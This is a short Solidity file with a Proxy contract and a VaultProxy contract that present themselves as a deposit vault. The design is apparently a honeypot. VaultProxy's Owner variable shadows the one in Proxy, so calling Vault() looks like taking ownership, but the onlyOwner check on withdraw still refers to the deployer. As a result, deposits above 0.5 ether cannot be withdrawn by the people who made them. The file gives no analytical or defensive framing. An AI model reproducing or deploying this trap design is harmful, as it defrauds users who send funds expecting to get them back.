pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) private depositAddress;
    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            depositAddress[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint256 userDeposit = depositAddress[msg.sender];
        if (amount > 0 && userDeposit >= amount) {
            msg.sender.transfer(amount);
        }
    }
}